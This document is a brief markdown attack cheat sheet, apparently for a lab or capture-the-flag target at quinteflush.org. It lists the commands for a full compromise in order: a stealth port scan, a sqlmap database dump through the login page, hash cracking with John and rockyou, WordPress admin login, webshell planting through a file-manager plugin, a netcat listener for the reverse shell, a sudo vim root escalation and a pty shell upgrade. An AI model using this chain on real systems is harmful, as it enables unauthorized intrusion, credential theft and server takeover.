# List of useful commands
This list contains useful commands to use during the attack

# Port enumeration
Enumerates all the open ports in a stealthier way
`nmap -sS -sV -vv 10.0.1.1 -p-`

# Dumping database
Dumping the database via SQLi
`sqlmap -u http://www.quinteflush.org/login.php --forms --dump --dbs --batch`

# crack the hash
From the database, crack the hash in hope of finding an admin password for wordpress
`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

Then login to `http://www.quinteflush.org/wp-admin` via `admin:********`
Install a file manager plugin and replace a webpage with a webshell

# Webshell
Use a listener on 0.0.0.0 with either port 80/tcp, 443/tcp or 53/tcp
`nc -lvnp 53`

Go to the edited webpage to trigger the webshell

# Privilege Escalation
First, let's enumerate all what are the sudo rights given to www-data
`sudo -l`

privilege escalation (gtfobins)
`sudo vim -c ':!/bin/sh'` 

upgrade the shell to interact better with the system
`python3 -c 'import pty; pty.spawn("/bin/bash")'`